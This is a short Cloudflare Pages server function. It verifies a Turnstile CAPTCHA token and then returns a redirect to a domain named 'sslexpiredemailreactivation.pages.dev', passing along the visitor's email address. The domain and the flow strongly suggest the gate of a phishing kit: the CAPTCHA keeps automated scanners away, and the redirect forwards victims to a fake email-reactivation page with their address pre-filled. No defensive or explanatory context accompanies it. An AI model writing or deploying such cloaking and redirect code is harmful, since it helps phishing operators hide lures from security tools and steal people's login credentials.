// functions/verify.js
export async function onRequestPost(context) {
  const { token, email } = await context.request.json();
  const secret = context.env.TURNSTILE_SECRET_KEY;

  const formData = new URLSearchParams();
  formData.append("secret", secret);
  formData.append("response", token);
  formData.append("remoteip", context.request.headers.get("CF-Connecting-IP") || "");

  const result = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
    method: "POST",
    body: formData
  });

  const outcome = await result.json();

  if (!outcome.success) {
    return new Response("Turnstile verification failed", { status: 403 });
  }

  const redirectUrl = `https://sslexpiredemailreactivation.pages.dev?email=${encodeURIComponent(email)}`;
  return new Response(JSON.stringify({ redirectUrl }), {
    headers: { "Content-Type": "application/json" },
    status: 200,
  });
}
